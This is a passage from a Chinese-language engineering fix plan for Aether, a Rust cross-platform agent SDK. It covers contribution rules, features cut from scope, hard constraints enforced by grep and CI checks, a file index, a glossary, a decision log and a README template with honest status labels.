2. **每修一个 task 同步更新 README 的 status 标签** — 这是项目"反馈环节修复"的核心
3. **每个 stage 结束写 RELEASE_NOTES** — 明确说"本版本完成了 T-X.Y、T-X.Z"，让用户知道项目真实进展
4. **不接受"我顺手改了别的"的 PR** — 每个 task 独立、可 revert，不要把 5 个改动塞进一个 PR
5. **阶段 2 开始之后所有 PR 必须通过 windows-latest + macos-latest CI** — 任何 OS 失败一律不合
6. **不再使用 ✅ Complete 这个标签** — 改用 §6 T-1.2 定义的四档（Functional / Partial / Stub / Planned）
7. **不接受新增功能 PR 在阶段 4 完成之前** — 项目当前的问题不是"功能太少"而是"功能虚标"
8. **任何"未来计划"必须有对应的 task 编号** — 没有 T-X.Y 的 feature 提议直接 close
9. **devlog.md 保留诚实记录** — 不删除"曾经标错"的历史条目；那是项目学到的教训
10. **新贡献者的第一个 PR 必须是阶段 1 的任务** — 这是了解项目状态的最快方式

---

# Part IV — 范围管理

## 14. 应砍掉而不是修的功能

为了让项目聚焦，**明确放弃**以下看似在范围内的功能。这些不进任何阶段，也不进未来 roadmap：

| 功能 | 砍掉理由 | 处理方式 |
|---|---|---|
| `ImageGenerate` 工具 | API wrapper，App 层做就行 | README 移除；T-1.1 已删注册 |
| `HomeAssistant` 工具 | 太特定，不属于通用 agent | README 移除；T-1.1 已删注册 |
| `CronJob` 工具 | App 层用 OS 机制（systemd timer / launchd / Task Scheduler）更合适 | README 移除；T-1.1 已删注册 |
| 通用浏览器工具（Playwright 等） | Rust 无成熟跨平台替代 | requirements.md 已承认；不动 |
| iOS/Android 上的真沙箱 ExecuteCode | 不存在 | T-4.1 按平台 gate |
| 18+ 消息平台适配器 | App 层 | requirements.md 已承认；不动 |
| Kanban / 消息网关 / TUI | 非 SDK 范围 | requirements.md 已承认；不动 |
| Computer Use（屏幕控制）| macOS 专用，不跨平台 | 不在 SDK 范围 |
| Image / TTS / STT 工具 | API wrapper，App 层做 | 不在 SDK 范围 |
| 通用 Plugin 系统 | MCP 替代 | 不重复造轮子 |

**项目应专精于：真 ReAct + 真工具 + 真记忆 + 真跨平台 SDK + 真 Hermes 数据兼容**。其他全部砍掉，README 也对应清理。

---

## 15. 不可逾越的硬约束

下列约束在所有修改中**必须保持**，否则项目会失去存在意义：

| 约束 | 含义 | 验证方式 |
|---|---|---|
| **核心代码 100% 跨平台** | agent-core 主路径不允许出现 `cfg!(target_os = "X")` 分支；平台差异在 trait 实现层 | `grep -rn "target_os" agent-core/src/` 仅出现在工具层 |
| **WASM 是一等公民** | 任何核心功能必须可在 `--target wasm32-unknown-unknown --no-default-features` 下编译 | T-1.3 CI 强制 |
| **数据格式兼容 Hermes** | MEMORY.md、USER.md、skills/*.md、SQLite schema 与 Hermes 互通 | T-2.3 测试 |
| **Trait 表面稳定** | `ChatModel` / `Tool` / `Memory` / `SessionStore` / `Streamable` 五个 trait 是 v1.0 公开 API；不允许 breaking 变更（除非 major bump）| 公开 API diff in CHANGELOG |
| **SDK 是薄绑定** | 任何 SDK 的代码量不允许超过 1000 行 — 超过说明你在 SDK 里写了逻辑，应该下沉到 agent-core | `wc -l sdks/*/main.{py,kt,swift,cs,ts}` |
| **没有桩函数注册进 ToolRegistry** | 永远不再向 LLM 工具表撒谎 | `grep -rn "register.*Stub\|note.*configure externally" agent-core/` 无结果 |
| **没有未读的 config 字段** | `cargo clippy -- -D dead_code` 必须过 | CI |
| **CI 必须跑测试不只编译** | `cargo test --workspace` 在 3 个 OS 上跑 | CI |

任何 PR 违反上述约束直接 close。

---

## 16. 文档版本管理

- **本文档（FIX_PLAN.md）是唯一权威修复方案**；其他历史文档（implementation-plan.md、requirements.md、tasks.md、devlog.md）保留作为历史记录，但**不再驱动开发**
- 修改本文档要 PR + review；不允许直接 push
- 每个 task 完成后在本文档对应 task 的标题旁加 `✓ Merged in PR #N`
- 整个阶段完成后在阶段标题旁加 `✓ Completed YYYY-MM-DD`

---

# 附录 A — 关键文件与文件夹索引

修复过程中最常打开的文件：

| 文件 | 行数 | 作用 | 出现在 task |
|---|---:|---|---|
| [agent-core/src/agent.rs](../agent-core/src/agent.rs) | 217 | AIAgent 构造 + 注册工具 | T-1.1, T-1.4, T-2.8, T-3.3 |
| [agent-core/src/loop_mod.rs](../agent-core/src/loop_mod.rs) | — | ReAct 主循环 | T-2.2, T-2.7, T-3.3 |
| [agent-core/src/config.rs](../agent-core/src/config.rs) | 182 | 23 个配置字段 | T-1.4, T-2.5 |
| [agent-core/src/prompt.rs](../agent-core/src/prompt.rs) | 52 | 系统提示词组装 | T-1.7, T-2.7 |
| [agent-core/src/profile.rs](../agent-core/src/profile.rs) | 83 | Profile 管理 | T-1.4, T-2.8 |
| [agent-core/src/breaker.rs](../agent-core/src/breaker.rs) | 86 | Circuit Breaker | T-1.7 |
| [agent-core/src/delegate.rs](../agent-core/src/delegate.rs) | 70 | 子代理（当前是桩）| T-1.6, T-3.6 |
| [agent-core/src/context.rs](../agent-core/src/context.rs) | 77 | ContextEngine（当前是 ls + date）| T-1.7, T-2.7 |
| [agent-core/src/llm/openai.rs](../agent-core/src/llm/openai.rs) | 508 | OpenAI provider | T-2.6, T-3.1 |
| [agent-core/src/llm/anthropic.rs](../agent-core/src/llm/anthropic.rs) | 344 | Anthropic provider | T-3.2 |
| [agent-core/src/llm/ollama.rs](../agent-core/src/llm/ollama.rs) | 3 | Ollama 占位 | （未来 task）|
| [agent-core/src/mcp/mod.rs](../agent-core/src/mcp/mod.rs) | 200 | MCP 协议（当前 stdio 损坏）| T-2.4 |
| [agent-core/src/memory/state.rs](../agent-core/src/memory/state.rs) | 193 | SQLite 持久化 | T-2.3 |
| [agent-core/src/memory/review.rs](../agent-core/src/memory/review.rs) | 121 | Background Review | T-3.4 |
| [agent-core/src/memory/curator.rs](../agent-core/src/memory/curator.rs) | 137 | Curator（从未启动）| T-3.5 |
| [agent-core/src/compression/mod.rs](../agent-core/src/compression/mod.rs) | 109 | Context Compression（死代码）| T-2.2 |
| [agent-core/src/tools/registry.rs](../agent-core/src/tools/registry.rs) | 89 | 工具注册表 | T-1.1, T-2.5 |
| [agent-core/src/tools/extra_tools.rs](../agent-core/src/tools/extra_tools.rs) | 107 | 桩工具 | T-1.1 |
| [agent-core/src/tools/file_tools.rs](../agent-core/src/tools/file_tools.rs) | 188 | 文件工具 | T-3.7 |
| [agent-core/src/tools/web_tools.rs](../agent-core/src/tools/web_tools.rs) | 163 | Web 工具 | T-3.8 |
| [agent-core/src/tools/terminal_tool.rs](../agent-core/src/tools/terminal_tool.rs) | 125 | Terminal 工具 | T-2.1 |
| [agent-core/src/tools/terminal_backends.rs](../agent-core/src/tools/terminal_backends.rs) | 151 | ExecuteCode 后端 | T-4.1 |
| [agent-core/src/tools/memory_tool.rs](../agent-core/src/tools/memory_tool.rs) | 92 | memory 工具 | T-3.9 |
| [agent-bindings/src/lib.rs](../agent-bindings/src/lib.rs) | — | UniFFI + WASM 绑定入口 | T-1.5 |
| [agent-bindings/Cargo.toml](../agent-bindings/Cargo.toml) | — | bindings 包配置 | T-1.5 |
| [agent-wasm/src/lib.rs](../agent-wasm/src/lib.rs) | 113 | WASM 入口（当前是 fetch wrapper）| T-4.2 |
| [.github/workflows/ci.yml](../.github/workflows/ci.yml) | 52 | CI 配置（当前不跑测试）| T-1.3, T-4.3 ~ T-4.6 |
| [sdks/dotnet/Aether/Aether.cs](../sdks/dotnet/Aether/Aether.cs) | 121 | C# SDK | T-2.6, T-4.5 |
| [sdks/android/src/main/java/aether/Aether.kt](../sdks/android/src/main/java/aether/Aether.kt) | 63 | Kotlin SDK 包装 | T-4.3 |
| [sdks/ios/aether.swift](../sdks/ios/aether.swift) | 822 | Swift SDK（疑为 uniffi 生成）| T-4.4 |
| [sdks/python/aether/aether.py](../sdks/python/aether/aether.py) | 1110 | Python SDK | T-4.6 |
| [sdks/typescript/src/index.ts](../sdks/typescript/src/index.ts) | 49 | TS SDK | T-4.2 |

---

# 附录 B — 术语表

| 术语 | 含义 |
|---|---|
| **ReAct Loop** | 推理 → 行动 → 观察 的循环；LLM 调工具后把结果回喂给 LLM 继续 |
| **Tool / Toolset** | 单个工具 / 按场景分组的工具集合（含 gating） |
| **MCP** | Model Context Protocol，JSON-RPC 协议；stdio + HTTP/SSE 两种传输 |
| **Skill** | agentskills.io 格式的可复用知识（frontmatter + Markdown）|
| **L1-L4 Memory** | L1=MEMORY.md, L2=USER.md, L3=skills/*.md, L4=SQLite 会话存档 |
| **Context Compression** | 长对话超过 token 上限时用辅助 LLM 摘要 + 会话拆分 |
| **Iteration Budget** | 限制单次会话的 LLM 调用次数（父 90 / 子 50）|
| **Circuit Breaker** | 检测并阻止无限工具调用循环（同签名连续 N 次报错）|
| **Background Review** | 每 turn 后异步审查 → 自动生成技能/记忆 |
| **Curator** | 技能生命周期管理：陈旧标记 → 归档 → 可恢复 |
| **Profile** | 完全隔离的多实例（独立配置/记忆/技能/会话）|
| **Sub-agent / Delegate** | 子代理：隔离上下文 + 受限工具集 + 独立预算 |
| **UniFFI** | Mozilla 跨语言绑定生成器（Rust → Kotlin/Swift/Python）|
| **agentskills.io** | Agent 技能文件的开放标准格式 |

---

# 附录 C — 决策记录

本文档制定时做过的关键决策（供未来 reviewer 理解 why）：

| 决策 | 理由 |
|---|---|
| **阶段 1 不增加任何能力**| 项目当前问题不是"功能少"而是"功能虚标"。先停止撒谎，才有资格谈增强。|
| **阶段 4 推迟到最后**| 跨平台 CI 工程量大且边际回报递减；先把核心做对再做广 |
| **采用四档 status 替代 ✅ Complete**| 二元标签是失真根源；四档强制 owner 在每个能力旁明确"缺什么" |
| **Curator 用 inline 检查而非后台守护**| 后台守护跨平台地雷多（移动端被系统杀、WASM 无线程）；inline + marker 文件更适合 SDK 形态 |
| **ExecuteCode 推荐 Docker 而非 Wasmtime**| Wasmtime 看起来更跨平台，但实用语言（Python/Node）的 WASM 生态还不成熟；Docker 是工程上诚实的折中 |
| **Web SDK 必须真接 agent-core**| 当前 agent-wasm 完全绕开核心，是项目"跨平台 SDK"定位的最大空话。修不修这一项决定项目是否真有存在意义 |
| **保留 devlog.md 中的失败记录**| 不删除"曾经标错"的历史，是项目反馈机制修复的一部分 |
| **不再追上游 Hermes 版本**| 数据格式兼容即可；代码同步会拖慢节奏 |
| **secret 处理用 secrecy crate 而非自研**| 自研容易漏（Debug、tracing、panic message 都要 zeroize），用成熟库 |
| **Anthropic 流式必须做**| Anthropic 是 prompt caching 收益最大的 provider；不做流式等于放弃 cache 命中率 |

---

# 附录 D — 项目修完后的 README 模板（参考）

阶段 4 完成后，README 头部应该长这样（不再有任何 ✅ Complete 这种二元标签）：

```markdown
# Aether — Cross-platform Agent SDK

> Hermes-compatible agent core in Rust. One core, six platforms.

[![CI](https://github.com/foreverxzhh/Aether/actions/workflows/ci.yml/badge.svg)]
[![Android](https://github.com/.../android.yml/badge.svg)]
[![iOS](https://github.com/.../ios.yml/badge.svg)]
[![Windows](https://github.com/.../ci.yml/badge.svg?event=windows)]
[![macOS](https://github.com/.../ci.yml/badge.svg?event=macos)]
[![WASM](https://github.com/.../ci.yml/badge.svg?event=wasm)]
[![tests](https://img.shields.io/badge/tests-N%20passing-brightgreen)]

## Capabilities

| Feature | Status | Notes |
|---|---|---|
| Agent Engine (ReAct) | ✅ Functional | 3 API modes; streaming with tool calls; budget & breaker |
| Learning Loop (Review + Curator) | ✅ Functional | Auto skill creation; 7-day curator cycle |
| L1-L4 Memory | ✅ Functional | MEMORY.md, USER.md, skills/, SQLite + FTS5 |
| Tool System (9 built-in tools) | ✅ Functional | file, terminal, web, memory, skill, MCP, delegate, http, execute_code |
| MCP Protocol | 🟡 Partial | stdio: ✅ / HTTP: 🚧 / Server: 🚧 / OAuth: 🚧 |
| Context Compression | ✅ Functional | Auxiliary LLM summarization + session split |
| Streaming | ✅ Functional | OpenAI + Anthropic SSE; ReAct loop included |
| Profile System | ✅ Functional | Multi-instance isolation |
| Sub-agent Delegation | ✅ Functional | Restricted toolset + spawn depth limit |
| Platform SDKs | ✅ Functional | Android, iOS, macOS, Windows, Linux, Web — all CI-verified |
```

把当前 README 顶部跟这个 diff 一比，差距清清楚楚。

---

> **结语**
>
> 这份文档不是"愿望清单"，是**31 个可执行任务**。每个任务有 file:line 证据、代码草稿、验收清单。
>
> 真正的瓶颈不在代码，在**作者是否愿意接受"把 ✅ 改回 🚧"这一步**。改完那一步之后，剩下的全是工程问题 —— 1 人 5-7 个月、3 人 2 个月可以推到诚实的 v1.0。
>
> 如果不改那一步，后面 100 个 PR 也只会让 README 与代码的距离越拉越远。**这份文档存在的目的，就是让那一步先发生**。
